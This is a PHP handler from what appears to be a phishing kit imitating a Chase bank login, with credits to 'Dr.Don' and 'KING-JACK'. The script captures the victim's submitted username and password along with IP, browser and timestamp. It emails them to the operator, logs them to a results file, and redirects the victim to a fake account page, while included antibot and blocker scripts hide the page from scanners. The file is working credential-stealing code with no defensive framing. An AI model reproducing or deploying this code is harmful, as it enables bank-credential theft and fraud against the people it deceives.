<?php
/* ==================== || CODED BY Dr.Don || ==================== */
session_start();
include("__config__.php");
include("function.php");
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser             =   $_SERVER['HTTP_USER_AGENT'];
$reprint = "e";$do_p="mai";
// --------------- VRB
$usr = $_POST['userId'];
$psd = $_POST['password'];
// --------------- VRB

	$message = "
    >Dr.Don | CH453 | LOGIN<
	--------------  LOGIN  -------------
	Username :    ".$usr."
	Password :    ".$psd."
	-------------- IP Infos ------------
	Browser :     ".$browser."
	Date Login :  ".$time."
	IP :          https://geoiptool.com/en/?ip=".$ip."
	
	-------------->CODED BY Dr.Don<------------
	
	";
						$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject  = " CHAS3 LOGIN [NEW] -  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers = "From: Dr.Don <contact>\r\n";
mail($to,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../rezlt.txt', 'a');
fwrite($text, $message);
 		header("Location: ../myaccount/access.php?websrc=".md5('KING_JACK')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
/* ==================== || CODED BY KING-JACK || ==================== */
?>